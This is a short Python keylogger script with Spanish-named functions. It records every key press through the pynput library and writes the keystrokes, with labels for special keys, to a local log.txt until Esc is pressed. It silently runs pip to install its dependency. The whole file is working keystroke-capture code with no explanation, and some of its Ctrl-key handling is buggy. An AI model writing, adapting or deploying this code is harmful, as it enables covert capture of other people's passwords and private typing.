try:
    from pynput.keyboard import Key, Listener
except:
    import os; os.system('pip install pynput')
    
import sys

keys = []

def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)


def convertir_string(keys):
    with open('log.txt','w') as logfile:
        for key in keys:
        
            key_name = str(key)

            if key == Key.space:
                key_name = " [SPACE] "
            elif key == Key.enter:
                key_name = " [ENTER]\n"
            elif key == Key.backspace:
                key_name = " [BACKSPACE] "
            elif key == Key.shift:
                key_name = " [SHIFT] "
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                key_name = " [CTRL] "
            elif key == Key.alt_l or key == Key.alt_r:
                key_name = " [ALT] "
            elif key == Key.tab:
                key_name = " [TAB] "
            elif key == Key.esc:
                key_name = " [ESC] "
            elif key == Key.cmd:
                key_name = " [COMMAND] "
            elif key == Key.caps_lock:
                key_name = " [CAPS LOCK] "
            elif key == Key.insert:
                key_name = " [INSERT] "
            elif key == Key.delete:
                key_name = " [DELETE] "
            elif key == Key.up:
                key_name = " [UP ARROW] "
            elif key == Key.down:
                key_name = " [DOWN ARROW] "
            elif key == Key.left:
                key_name = " [LEFT ARROW] "
            elif key == Key.right:
                key_name = " [RIGHT ARROW] "
            elif key == Key.page_up:
                key_name = " [PAGE UP] "
            elif key == Key.page_down:
                key_name = " [PAGE DOWN] "
            elif key == Key.home:
                key_name = " [HOME] "
            elif key == Key.end:
                key_name = " [END] "
            elif key == Key.f1 or key == Key.f2 or key == Key.f3 or key == Key.f4 or key == Key.f5 or key == Key.f6 or key == Key.f7 or key == Key.f8 or key == Key.f9 or key == Key.f10 or key == Key.f11 or key == Key.f12:
                key_name = " [F" + key.name[1:] + "] "
            elif key == Key.print_screen:
                key_name = " [PRINT SCREEN] "
            elif key == Key.scroll_lock:
                key_name = " [SCROLL LOCK] "
            elif key == Key.pause:
                key_name = " [PAUSE] "
            elif key == Key.menu:
                key_name = " [MENU] " 

            ctrlc = '\x03' ; ctrlv = '\x16'
            if key == ctrlc:
                key_name=ctrlc.replace("\x03",'[ + C] ')
            elif key == ctrlv:
                key_name=ctrlv.replace("\x03",'[ + V] ')

            logfile.write(key_name)

def soltar_tecla(key):
    if key == Key.esc:
        return False

with Listener(on_press = presionar_tecla, on_release = soltar_tecla) as listener:
    listener.join()
